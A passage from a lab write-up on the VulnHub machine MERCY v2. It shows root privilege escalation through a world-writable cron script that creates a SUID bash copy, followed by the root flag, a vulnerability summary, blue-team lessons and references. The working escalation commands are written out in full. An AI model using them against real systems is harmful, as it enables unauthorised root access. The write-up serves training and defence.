cat /home/fluffy/.private/secrets/timeclock     # a harmless bash script

printf '#!/bin/bash\ncp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash\n' \
  > /home/fluffy/.private/secrets/timeclock

# wait up to ~3 minutes for cron
ls -la /tmp/rootbash
/tmp/rootbash -p
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

> **How to read it:** We replaced the cron script with one that copies `bash` to `/tmp` and sets the
> **SUID** bit. When root runs it, `rootbash` becomes a root-owned SUID binary; running it with `-p`
> (preserve privileges) yields a root shell regardless of who we are.

### 4.5 The root flag

```bash
cat /root/proof.txt
```

```text
Congratulations on rooting MERCY. :-)
```

> **Note:** Flag filenames and contents differ between builds. Look for `proof.txt` and
> `author-secret.txt` in `/root`. A **kernel** exploit is also reported to work on some builds — try
> harder, the cron path is the intended one.

![root and the flag](images/04-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | SMB share `qiu` exposed with a weak password (`password`) | Samba, port 445 | Unauthorised read of a user's home directory |
| 2 | `knockd` configuration readable from the share | `.private/opensesame/config(print)` | Port-knock sequence disclosed; firewall bypass |
| 3 | RIPS 0.53 Local File Inclusion (`file=`) | Web app on port 80 | Arbitrary file read |
| 4 | Tomcat Manager credentials in a world-readable config | `tomcat-users.xml` | Web shell deployment as `tomcat7` |
| 5 | World-writable script executed by root cron | `/home/fluffy/.private/secrets/timeclock` | Full privilege escalation to root |

---

## 6. Defensive lessons (blue team)

- **Enforce strong passwords and lockouts.** A single weak share password exposed a user's home
  directory. Ban dictionary passwords and monitor failed authentication.
- **Do not expose home directories as SMB shares.** Share only purpose-built, permission-restricted
  directories.
- **Treat port knocking as a weak control.** It hides a service but its sequence can leak in a config
  file; pair it with proper authentication, not as the *only* barrier.
- **Patch vulnerable web tools.** RIPS 0.53 is ancient and ships an LFI; remove unused tools from
  production web roots.
- **Protect Tomcat Manager.** Store `tomcat-users.xml` with strict permissions, use strong unique
  passwords, and disable the Manager/host-manager apps if unused.
- **Audit scheduled tasks and file permissions.** Never let root run a world-writable script. Mount
  `/home` `nosuid` and monitor cron changes with a file-integrity tool.

---

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- [VulnHub official entry — digitalworld.local: MERCY v2](https://vulnhub.com/entry/digitalworldlocal-mercy-v2,263/)
- [Exploit-DB 18660 — RIPS 0.53 Multiple Local File Inclusions](https://www.exploit-db.com/exploits/18660)
- [knockd — port-knocking daemon](https://linux.die.net/man/1/knockd)
- [Apache Tomcat Manager documentation](https://tomcat.apache.org/tomcat-7.0-doc/manager-howto.html)
- [pspy — unprivileged Linux process snooping](https://github.com/DominicBreuker/pspy)
- [OWASP — Testing for Local File Inclusion](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — ARP/host discovery showing the target IP
- [ ] `images/02-nmap.png` — TCP scan highlighting filtered 22/80 and Tomcat on 8080
- [ ] `images/03-foothold.png` — SMB loot, the knockd config, and the Tomcat shell
- [ ] `images/04-knock.png` — `knock` opening the ports, then nmap showing them open
- [ ] `images/05-lfi.png` — RIPS LFI reading `tomcat-users.xml`
- [ ] `images/06-tomcat-deploy.png` — WAR deployed and reverse shell caught
- [ ] `images/07-cron.png` — `pspy` showing root running `timeclock`
- [ ] `images/08-root-flag.png` — root shell and `proof.txt`

> **How to read it:** Store screenshots in `labs/4-080-digitalworldlocal-mercy-v2/images/` and reference
> them here with relative paths.

---

_Part of the [Cybersecurity101-Labs](../../README.md) collection. See the complete [catalog](../../docs/CATALOG.md). Educational use only in authorized lab environments._
